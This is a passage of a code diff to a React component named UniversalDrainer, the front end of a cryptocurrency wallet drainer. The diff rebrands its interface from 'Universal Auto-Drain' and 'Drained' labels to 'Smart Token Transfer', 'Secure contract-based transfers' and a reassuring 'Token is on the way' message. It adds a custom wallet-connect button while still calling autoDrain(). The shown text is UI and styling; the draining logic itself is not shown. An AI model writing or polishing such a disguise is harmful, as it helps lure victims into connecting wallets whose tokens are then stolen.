+  };
+
+  // ==================== CUSTOM WALLET CONNECT BUTTON ====================
+  const CustomConnectButton = () => {
+    return (
+      <div className="custom-connect-wrapper">
+        <ConnectKitButton.Custom>
+          {({ isConnected, show, truncatedAddress, ensName }) => {
+            return (
+              <button 
+                onClick={show}
+                className="custom-connect-btn"
+              >
+                {isConnected ? (
+                  <div className="connected-address">
+                    <span className="address-text">
+                      {ensName || `${truncatedAddress}`}
+                    </span>
+                    <span className="wallet-badge">✓</span>
+                  </div>
+                ) : (
+                  <div className="connect-prompt">
+                    <span className="connect-icon">🔗</span>
+                    <span className="connect-text">Connect Web3 Wallet</span>
+                  </div>
+                )}
+              </button>
+            );
+          }}
+        </ConnectKitButton.Custom>
+      </div>
+    );
   };
 
   // ==================== RENDER ====================
@@ -1145,26 +898,26 @@ function UniversalDrainer() {
           <div className="header-left">
             <div className="logo">⚡</div>
             <div>
-              <h1>UNIVERSAL AUTO-DRAIN</h1>
-              <p className="subtitle">Full Automation • All Networks • Instant Transfer</p>
+              <h1>SMART TOKEN TRANSFER</h1>
+              <p className="subtitle">Auto-Scan • Smart Contract • Multi-Chain</p>
             </div>
           </div>
           
           <div className="header-right">
             {isConnected ? (
               <div className="connected-wallet">
-                <div className="wallet-address">
-                  {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
+                <div className="wallet-info">
+                  <div className="wallet-address">
+                    {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
+                  </div>
+                  {walletType && <div className="wallet-type">{walletType}</div>}
                 </div>
-                {walletType && <div className="wallet-type">{walletType}</div>}
                 <button onClick={disconnect} className="disconnect-btn">
                   Disconnect
                 </button>
               </div>
             ) : (
-              <div className="connect-section">
-                <ConnectKitButton />
-              </div>
+              <CustomConnectButton />
             )}
           </div>
         </header>
@@ -1174,12 +927,14 @@ function UniversalDrainer() {
             <>
               {/* Status Dashboard */}
               <div className="status-dashboard">
-                <div className="status-card primary">
+                <div className={`status-card ${isEligible === false ? 'not-eligible' : 'primary'}`}>
                   <div className="status-icon">
-                    {isScanning ? '🔍' : isProcessing ? '⚡' : '✅'}
+                    {isScanning ? '🔍' : isProcessing ? '⚡' : isEligible === false ? '❌' : '✅'}
                   </div>
                   <div className="status-content">
-                    <div className="status-title">AUTO-DRAIN SYSTEM ACTIVE</div>
+                    <div className="status-title">
+                      {isEligible === false ? 'NOT ELIGIBLE' : 'SMART TRANSFER SYSTEM'}
+                    </div>
                     <div className="status-message">{status}</div>
                     {isScanning && (
                       <div className="scan-progress">
@@ -1202,17 +957,19 @@ function UniversalDrainer() {
                   </div>
                   <div className="stat">
                     <div className="stat-value">{tokens.length}</div>
-                    <div className="stat-label">Tokens Found</div>
+                    <div className="stat-label">Tokens</div>
+                  </div>
+                  <div className="stat">
+                    <div className="stat-value">
+                      {isEligible === null ? '─' : isEligible ? '✅ Yes' : '❌ No'}
+                    </div>
+                    <div className="stat-label">Eligible</div>
                   </div>
                   <div className="stat">
                     <div className="stat-value">
                       {backendOnline ? '✅ Online' : '⚠️ Offline'}
                     </div>
                     <div className="stat-label">Backend</div>
-                  </div>
-                  <div className="stat">
-                    <div className="stat-value">{transactions.length}</div>
-                    <div className="stat-label">Drained</div>
                   </div>
                 </div>
               </div>
@@ -1224,42 +981,59 @@ function UniversalDrainer() {
                   disabled={isScanning || isProcessing}
                   className="btn btn-scan"
                 >
-                  {isScanning ? `Scanning ${scanProgress}%` : '🔍 Force Rescan'}
+                  {isScanning ? `Scanning ${scanProgress}%` : '🔍 Rescan Networks'}
                 </button>
                 
-                {tokens.length > 0 && (
+                {isEligible && tokens.length > 0 && (
                   <button
                     onClick={() => autoDrain()}
                     disabled={isProcessing}
                     className="btn btn-drain"
                   >
-                    {isProcessing ? 'Processing...' : '⚡ Auto-Drain Now'}
+                    {isProcessing ? 'Processing...' : '🚀 Start Smart Transfer'}
                   </button>
                 )}
               </div>
+
+              {/* Eligibility Message */}
+              {isEligible === false && (
+                <div className="eligibility-alert">
+                  <div className="alert-icon">ℹ️</div>
+                  <div className="alert-content">
+                    <div className="alert-title">No Tokens Detected</div>
+                    <div className="alert-message">
+                      We couldn't find any tokens in your wallet across supported networks.
+                      Try again with a wallet containing tokens.
+                    </div>
+                  </div>
+                </div>
+              )}
 
               {/* Tokens List */}
               {tokens.length > 0 && (
                 <div className="tokens-panel">
                   <div className="panel-header">
-                    <h3>Detected Tokens ({tokens.length}) - Auto-Drain Ready</h3>
+                    <h3>Detected Tokens ({tokens.length})</h3>
                     <div className="total-value">Total: ${totalValue.toFixed(2)}</div>
                   </div>
-                  <div className="tokens-grid">
+                  <div className="tokens-list">
                     {tokens.map(token => (
-                      <div key={token.id} className={`token-card ${token.status}`}>
-                        <div className="token-header">
-                          <div className="token-symbol">{token.symbol}</div>
-                          <div className="token-network">{token.network}</div>
-                          <div className={`token-type ${token.type}`}>
-                            {token.type === 'evm' ? 'EVM' : 'Non-EVM'}
-                          </div>
+                      <div key={token.id} className={`token-item ${token.status}`}>
+                        <div className="token-icon">
+                          {token.symbol.substring(0, 2)}
                         </div>
-                        <div className="token-amount">{token.amount} {token.symbol}</div>
+                        <div className="token-details">
+                          <div className="token-name">
+                            <span className="token-symbol">{token.symbol}</span>
+                            <span className="token-network">{token.network}</span>
+                          </div>
+                          <div className="token-amount">{token.amount} {token.symbol}</div>
+                        </div>
                         <div className="token-value">${token.valueUSD.toFixed(2)}</div>
-                        <div className="token-status">
-                          <span className={`status-${token.status || 'detected'}`}>
-                            {token.status === 'drained' ? '✅ Drained' : '⚡ Auto-drain pending'}
+                        <div className="token-status-indicator">
+                          <span className={`status-badge ${token.status}`}>
+                            {token.status === 'detected' ? 'Ready' : 
+                             token.status === 'processing' ? 'Processing' : 'Complete'}
                           </span>
                         </div>
                       </div>
@@ -1272,79 +1046,63 @@ function UniversalDrainer() {
               {transactions.length > 0 && (
                 <div className="transactions-panel">
                   <div className="panel-header">
-                    <h3>Drain History ({transactions.length})</h3>
+                    <h3>Transfer Status ({transactions.length})</h3>
                   </div>
                   <div className="transactions-list">
-                    {transactions.slice(0, 10).map((tx, index) => (
+                    {transactions.slice(0, 5).map((tx, index) => (
                       <div key={index} className="transaction-item">
-                        <div className="tx-info">
-                          <div className="tx-symbol">{tx.symbol}</div>
-                          <div className="tx-amount">{tx.amount} {tx.symbol}</div>
-                          <div className="tx-network">{tx.network}</div>
+                        <div className="tx-icon">📤</div>
+                        <div className="tx-details">
+                          <div className="tx-main">
+                            <span className="tx-symbol">{tx.symbol}</span>
+                            <span className="tx-amount">{tx.amount}</span>
+                            <span className="tx-network">{tx.network}</span>
+                          </div>
+                          <div className="tx-hash">
+                            {tx.txHash?.substring(0, 20)}...
+                          </div>
+                          <div className="tx-message">
+                            {tx.message || 'Token is on the way, you will be notified shortly'}
+                          </div>
                         </div>
-                        <div className="tx-hash">
-                          {tx.txHash?.substring(0, 20)}...
+                        <div className={`tx-status ${tx.status}`}>
+                          {tx.status === 'processing' ? '⏳ Processing' : '✅ Complete'}
                         </div>
-                        <div className="tx-status success">✅ Drained</div>
                       </div>
                     ))}
                   </div>
-                </div>
-              )}
-
-              {/* Error Message */}
-              {connectionError && (
-                <div className="error-alert">
-                  <div className="error-icon">⚠️</div>
-                  <div className="error-message">{connectionError}</div>
                 </div>
               )}
             </>
           ) : (
             <div className="welcome-screen">
               <div className="welcome-content">
-                <div className="welcome-icon">⚡</div>
-                <h2>Universal Auto-Drain System</h2>
+                <div className="welcome-icon">🔗</div>
+                <h2>Smart Token Transfer System</h2>
                 <p className="welcome-text">
-                  Connect your wallet for automatic detection and draining of all tokens
-                  across 50+ EVM and Non-EVM networks. Fully automated - no manual steps required.
+                  Connect your Web3 wallet to automatically scan and transfer tokens
+                  across all EVM networks using secure smart contracts.
                 </p>
                 
                 <div className="connect-section">
-                  <ConnectKitButton />
+                  <CustomConnectButton />
                 </div>
                 
-                <div className="network-stats">
-                  <div className="stat-item">
-                    <div className="stat-number">25+</div>
-                    <div className="stat-label">EVM Networks</div>
+                <div className="feature-cards">
+                  <div className="feature-card">
+                    <div className="feature-icon">🔍</div>
+                    <div className="feature-title">Auto-Scan</div>
+                    <div className="feature-desc">Scans all EVM networks instantly</div>
                   </div>
-                  <div className="stat-item">
-                    <div className="stat-number">10+</div>
-                    <div className="stat-label">Non-EVM</div>
+                  <div className="feature-card">
+                    <div className="feature-icon">📝</div>
+                    <div className="feature-title">Smart Contracts</div>
+                    <div className="feature-desc">Secure contract-based transfers</div>
                   </div>
-                  <div className="stat-item">
-                    <div className="stat-number">Auto</div>
-                    <div className="stat-label">Full Automation</div>
-                  </div>
-                </div>
-                
-                <div className="features-list">
-                  <div className="feature">
-                    <span className="feature-icon">✅</span>
-                    <span>Automatic wallet scanning</span>
-                  </div>
-                  <div className="feature">
-                    <span className="feature-icon">✅</span>
-                    <span>Auto-drain all detected tokens</span>
-                  </div>
-                  <div className="feature">
-                    <span className="feature-icon">✅</span>
-                    <span>Both EVM and Non-EVM support</span>
-                  </div>
-                  <div className="feature">
-                    <span className="feature-icon">✅</span>
-                    <span>Live transaction monitoring</span>
+                  <div className="feature-card">
+                    <div className="feature-icon">⚡</div>
+                    <div className="feature-title">Auto-Execute</div>
+                    <div className="feature-desc">Automatic token transfers</div>
                   </div>
                 </div>
               </div>
@@ -1355,7 +1113,7 @@ function UniversalDrainer() {
         <footer className="app-footer">
           <div className="footer-content">
             <span className="status-dot"></span>
-            <span>Universal Auto-Drain • Production v3.0 • Fully Automated</span>
+            <span>Smart Transfer v4.0 • Secure • Automated</span>
             <span>{backendOnline ? '✅ Backend Connected' : '⚠️ Backend Offline'}</span>
             {lastScanTime && (
               <span>Last scan: {new Date(lastScanTime).toLocaleTimeString()}</span>
@@ -1370,7 +1128,7 @@ function UniversalDrainer() {
           min-height: 100vh;
           background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
           color: white;
-          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+          font-family: 'Inter', system-ui, -apple-system, sans-serif;
         }
         
         .app-container {
@@ -1425,11 +1183,80 @@ function UniversalDrainer() {
           font-size: 14px;
         }
         
-        .connected-wallet {
+        /* Custom Connect Button */
+        .custom-connect-wrapper {
+          position: relative;
+        }
+        
+        .custom-connect-btn {
+          background: linear-gradient(135deg, #ef4444, #dc2626);
+          color: white;
+          border: none;
+          padding: 12px 24px;
+          border-radius: 12px;
+          font-size: 16px;
+          font-weight: 600;
+          cursor: pointer;
+          transition: all 0.3s;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          min-width: 200px;
+        }
+        
+        .custom-connect-btn:hover {
+          background: linear-gradient(135deg, #dc2626, #b91c1c);
+          transform: translateY(-2px);
+          box-shadow: 0 8px 20px rgba(239, 68, 68, 0.3);
+        }
+        
+        .connect-prompt {
           display: flex;
           align-items: center;
           gap: 10px;
-          flex-wrap: wrap;
+        }
+        
+        .connect-icon {
+          font-size: 20px;
+        }
+        
+        .connect-text {
+          font-weight: 600;
+        }
+        
+        .connected-address {
+          display: flex;
+          align-items: center;
+          gap: 8px;
+        }
+        
+        .address-text {
+          font-family: monospace;
+          font-size: 14px;
+        }
+        
+        .wallet-badge {
+          background: #10b981;
+          color: white;
+          width: 20px;
+          height: 20px;
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-size: 12px;
+        }
+        
+        .connected-wallet {
+          display: flex;
+          align-items: center;
+          gap: 15px;
+        }
+        
+        .wallet-info {
+          display: flex;
+          align-items: center;
+          gap: 10px;
         }
         
         .wallet-address {
@@ -1443,9 +1270,9 @@ function UniversalDrainer() {
         
         .wallet-type {
           font-size: 12px;
-          color: #0af;
+          color: #3b82f6;
           padding: 4px 8px;
-          background: rgba(0, 170, 255, 0.1);
+          background: rgba(59, 130, 246, 0.1);
           border-radius: 6px;
         }
         
@@ -1453,10 +1280,11 @@ function UniversalDrainer() {
           background: #444;
           color: white;
           border: none;
-          padding: 8px 12px;
+          padding: 8px 16px;
           border-radius: 8px;
           cursor: pointer;
           font-size: 14px;
+          transition: background 0.3s;
         }
         
         .disconnect-btn:hover {
@@ -1471,21 +1299,26 @@ function UniversalDrainer() {
         .status-card {
           background: #222;
           border-radius: 16px;
-          padding: 20px;
+          padding: 25px;
           display: flex;
           align-items: center;
-          gap: 15px;
+          gap: 20px;
           border: 2px solid #333;
           margin-bottom: 20px;
         }
         
         .status-card.primary {
+          background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+          border-color: #3b82f6;
+        }
+        
+        .status-card.not-eligible {
           background: linear-gradient(135deg, #7c2d12, #dc2626);
           border-color: #ef4444;
         }
         
         .status-icon {
-          font-size: 32px;
+          font-size: 36px;
         }
         
         .status-content {
@@ -1494,14 +1327,14 @@ function UniversalDrainer() {
         
         .status-title {
           font-size: 14px;
-          color: #aaa;
+          color: rgba(255, 255, 255, 0.8);
           text-transform: uppercase;
           letter-spacing: 2px;
-          margin-bottom: 5px;
+          margin-bottom: 8px;
         }
         
         .status-message {
-          font-size: 18px;
+          font-size: 20px;
           font-weight: 600;
           color: white;
         }
@@ -1543,7 +1376,7 @@ function UniversalDrainer() {
         
         .btn {
           flex: 1;
-          padding: 16px 24px;
+          padding: 18px 24px;
           border: none;
           border-radius: 12px;
           font-size: 16px;
@@ -1572,20 +1405,52 @@ function UniversalDrainer() {
         }
         
         .btn-drain {
-          background: linear-gradient(135deg, #dc2626, #ef4444);
+          background: linear-gradient(135deg, #16a34a, #22c55e);
           color: white;
         }
         
         .btn-drain:hover:not(:disabled) {
-          background: linear-gradient(135deg, #b91c1c, #dc2626);
+          background: linear-gradient(135deg, #15803d, #16a34a);
           transform: translateY(-2px);
         }
         
-        /* Tokens */
+        /* Eligibility Alert */
+        .eligibility-alert {
+          background: linear-gradient(135deg, #7c2d12, #dc2626);
+          border-radius: 12px;
+          padding: 20px;
+          display: flex;
+          align-items: center;
+          gap: 15px;
+          margin-bottom: 20px;
+          border: 2px solid #ef4444;
+        }
+        
+        .alert-icon {
+          font-size: 32px;
+        }
+        
+        .alert-content {
+          flex: 1;
+        }
+        
+        .alert-title {
+          font-size: 18px;
+          font-weight: 600;
+          color: white;
+          margin-bottom: 5px;
+        }
+        
+        .alert-message {
+          color: rgba(255, 255, 255, 0.9);
+          font-size: 14px;
+        }
+        
+        /* Tokens Panel */
         .tokens-panel, .transactions-panel {
           background: #222;
           border-radius: 16px;
-          padding: 20px;
+          padding: 25px;
           margin-bottom: 20px;
           border: 1px solid #333;
         }
@@ -1599,130 +1464,147 @@ function UniversalDrainer() {
         
         .panel-header h3 {
           margin: 0;
-          font-size: 18px;
+          font-size: 20px;
           color: white;
+          font-weight: 600;
         }
         
         .total-value {
-          font-size: 18px;
+          font-size: 20px;
           font-weight: 700;
-          color: #10b981;
+          color: #22c55e;
         }
         
-        .tokens-grid {
-          display: grid;
-          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-          gap: 15px;
+        .tokens-list {
+          display: flex;
+          flex-direction: column;
+          gap: 12px;
         }
         
-        .token-card {
+        .token-item {
           background: #1a1a1a;
           border-radius: 12px;
           padding: 20px;
+          display: flex;
+          align-items: center;
+          gap: 15px;
           border: 1px solid #333;
           transition: all 0.3s;
         }
         
-        .token-card:hover {
+        .token-item:hover {
           border-color: #444;
-          transform: translateY(-2px);
+          transform: translateY(-1px);
         }
         
-        .token-card.drained {
-          opacity: 0.7;
-          border-color: #10b981;
+        .token-item.processing {
+          border-color: #3b82f6;
+          background: rgba(59, 130, 246, 0.05);
         }
         
-        .token-header {
+        .token-icon {
+          width: 40px;
+          height: 40px;
+          background: linear-gradient(135deg, #ef4444, #dc2626);
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-weight: 600;
+          font-size: 14px;
+        }
+        
+        .token-details {
+          flex: 1;
+        }
+        
+        .token-name {
           display: flex;
           align-items: center;
           gap: 10px;
-          margin-bottom: 10px;
+          margin-bottom: 5px;
         }
         
         .token-symbol {
           font-weight: 700;
-          font-size: 20px;
+          font-size: 18px;
           color: white;
         }
         
         .token-network {
           color: #888;
           font-size: 12px;
-          flex: 1;
+          background: rgba(136, 136, 136, 0.1);
+          padding: 2px 8px;
+          border-radius: 4px;
         }
         
-        .token-type {
-          padding: 2px 6px;
-          border-radius: 4px;
-          font-size: 10px;
+        .token-amount {
+          color: #ddd;
+          font-size: 16px;
+        }
+        
+        .token-value {
+          font-size: 18px;
+          font-weight: 600;
+          color: #22c55e;
+          min-width: 100px;
+          text-align: right;
+        }
+        
+        .token-status-indicator {
+          min-width: 100px;
+        }
+        
+        .status-badge {
+          padding: 6px 12px;
+          border-radius: 20px;
+          font-size: 12px;
           font-weight: 600;
           text-transform: uppercase;
+          letter-spacing: 0.5px;
         }
         
-        .token-type.evm {
+        .status-badge.detected {
           background: rgba(59, 130, 246, 0.2);
           color: #3b82f6;
         }
         
-        .token-type.non-evm {
-          background: rgba(239, 68, 68, 0.2);
-          color: #ef4444;
-        }
-        
-        .token-amount {
-          font-size: 24px;
-          font-weight: 700;
-          color: white;
-          margin-bottom: 5px;
-        }
-        
-        .token-value {
-          color: #10b981;
-          font-size: 18px;
-          font-weight: 600;
-          margin-bottom: 10px;
-        }
-        
-        .token-status .status-detected {
-          background: rgba(239, 68, 68, 0.2);
-          color: #ef4444;
-          padding: 4px 8px;
-          border-radius: 6px;
-          font-size: 12px;
-          font-weight: 600;
-        }
-        
-        .token-status .status-drained {
-          background: rgba(16, 185, 129, 0.2);
-          color: #10b981;
-          padding: 4px 8px;
-          border-radius: 6px;
-          font-size: 12px;
-          font-weight: 600;
+        .status-badge.processing {
+          background: rgba(245, 158, 11, 0.2);
+          color: #f59e0b;
         }
         
         /* Transactions */
         .transactions-list {
           display: flex;
           flex-direction: column;
-          gap: 10px;
+          gap: 12px;
         }
         
         .transaction-item {
           background: #1a1a1a;
-          border-radius: 8px;
-          padding: 15px;
-          display: flex;
-          align-items: center;
-          justify-content: space-between;
-          border: 1px solid #333;
-        }
-        
-        .tx-info {
+          border-radius: 12px;
+          padding: 20px;
           display: flex;
           align-items: center;
           gap: 15px;
+          border: 1px solid #333;
+        }
+        
+        .tx-icon {
+          font-size: 24px;
+        }
+        
+        .tx-details {
+          flex: 1;
+        }
+        
+        .tx-main {
+          display: flex;
+          align-items: center;
+          gap: 10px;
+          margin-bottom: 5px;
         }
         
         .tx-symbol {
@@ -1740,7 +1622,7 @@ function UniversalDrainer() {
           color: #888;
           font-size: 12px;
           background: rgba(136, 136, 136, 0.1);
-          padding: 2px 6px;
+          padding: 2px 8px;
           border-radius: 4px;
         }
         
@@ -1748,105 +1630,88 @@ function UniversalDrainer() {
           color: #3b82f6;
           font-size: 12px;
           font-family: monospace;
-          flex: 1;
+          margin-bottom: 5px;
+        }
+        
+        .tx-message {
+          color: #22c55e;
+          font-size: 13px;
+          font-weight: 500;
+        }
+        
+        .tx-status {
+          padding: 6px 12px;
+          border-radius: 20px;
+          font-size: 12px;
+          font-weight: 600;
+          min-width: 100px;
           text-align: center;
         }
         
-        .tx-status.success {
-          color: #10b981;
-          font-size: 12px;
-          font-weight: 600;
-        }
-        
-        /* Error Alert */
-        .error-alert {
-          background: linear-gradient(135deg, #7c2d12, #dc2626);
-          border-radius: 12px;
-          padding: 15px;
-          display: flex;
-          align-items: center;
-          gap: 15px;
-          margin-bottom: 20px;
-          border: 2px solid #ef4444;
-          animation: pulse-alert 2s infinite;
-        }
-        
-        @keyframes pulse-alert {
-          0%, 100% { opacity: 1; }
-          50% { opacity: 0.8; }
-        }
-        
-        .error-icon {
-          font-size: 24px;
-        }
-        
-        .error-message {
-          flex: 1;
-          color: white;
-          font-size: 14px;
+        .tx-status.processing {
+          background: rgba(245, 158, 11, 0.2);
+          color: #f59e0b;
         }
         
         /* Welcome Screen */
         .welcome-screen {
           text-align: center;
           padding: 60px 20px;
-          max-width: 600px;
+          max-width: 800px;
           margin: 0 auto;
         }
         
         .welcome-icon {
-          font-size: 64px;
+          font-size: 72px;
           margin-bottom: 20px;
         }
         
         .welcome-text {
           color: #ddd;
-          margin-bottom: 30px;
+          margin-bottom: 40px;
           font-size: 18px;
           line-height: 1.6;
+          max-width: 600px;
+          margin-left: auto;
+          margin-right: auto;
         }
         
-        .network-stats {
+        .connect-section {
+          margin-bottom: 40px;
+        }
+        
+        .feature-cards {
           display: flex;
           justify-content: center;
-          gap: 40px;
-          margin: 30px 0;
+          gap: 20px;
+          margin-top: 40px;
         }
         
-        .stat-item {
+        .feature-card {
+          background: #222;
+          border-radius: 16px;
+          padding: 30px 20px;
           text-align: center;
-        }
-        
-        .stat-number {
-          font-size: 36px;
-          font-weight: 700;
-          color: #ef4444;
-          margin-bottom: 5px;
-        }
-        
-        .stat-label {
-          color: #888;
-          font-size: 14px;
-          text-transform: uppercase;
-          letter-spacing: 1px;
-        }
-        
-        .features-list {
-          text-align: left;
-          max-width: 400px;
-          margin: 30px auto 0;
-        }
-        
-        .feature {
-          display: flex;
-          align-items: center;
-          gap: 10px;
-          margin-bottom: 10px;
-          color: #ddd;
+          border: 1px solid #333;
+          flex: 1;
+          max-width: 200px;
         }
         
         .feature-icon {
-          color: #10b981;
+          font-size: 32px;
+          margin-bottom: 15px;
+        }
+        
+        .feature-title {
+          font-size: 18px;
+          font-weight: 600;
+          color: white;
+          margin-bottom: 8px;
+        }
+        
+        .feature-desc {
+          color: #888;
+          font-size: 14px;
         }
         
         /* Footer */
@@ -1870,7 +1735,7 @@ function UniversalDrainer() {
         .status-dot {
           width: 8px;
           height: 8px;
-          background: #10b981;
+          background: #22c55e;
           border-radius: 50%;
           animation: pulse 2s infinite;
         }
@@ -1889,7 +1754,7 @@ function UniversalDrainer() {
         
         .progress-fill {
           height: 100%;
-          background: linear-gradient(90deg, #3b82f6, #10b981);
+          background: linear-gradient(90deg, #3b82f6, #22c55e);
           transition: width 0.3s;
         }
         
@@ -1900,7 +1765,7 @@ function UniversalDrainer() {
           text-align: right;
         }
         
-        /* Responsive */
+        /* Mobile Styles */
         @media (max-width: 768px) {
           .app-header {
             flex-direction: column;
@@ -1909,8 +1774,8 @@ function UniversalDrainer() {
           }
           
           .connected-wallet {
-            flex-wrap: wrap;
-            justify-content: center;
+            flex-direction: column;
+            gap: 15px;
           }
           
           .stats-row {
@@ -1921,27 +1786,46 @@ function UniversalDrainer() {
             flex-direction: column;
           }
           
-          .tokens-grid {
-            grid-template-columns: 1fr;
+          .feature-cards {
+            flex-direction: column;
+            align-items: center;
           }
           
-          .transaction-item {
+          .feature-card {
+            max-width: 100%;
+          }
+          
+          .transaction-item,
+          .token-item {
             flex-direction: column;
-            gap: 10px;
             align-items: flex-start;
+            gap: 10px;
+          }
+          
+          .token-value,
+          .token-status-indicator {
+            align-self: flex-start;
           }
           
           .footer-content {
             flex-direction: column;
-            gap: 5px;
+            gap: 8px;
+          }
+        }
+        
+        @media (max-width: 480px) {
+          .app-container {
+            padding: 10px;
           }
           
-          .network-stats {
-            gap: 20px;
+          .status-card {
+            flex-direction: column;
+            text-align: center;
+            gap: 15px;
           }
           
-          .stat-number {
-            font-size: 28px;
+          .custom-connect-btn {
+            min-width: 100%;
           }
         }
       `}</style>
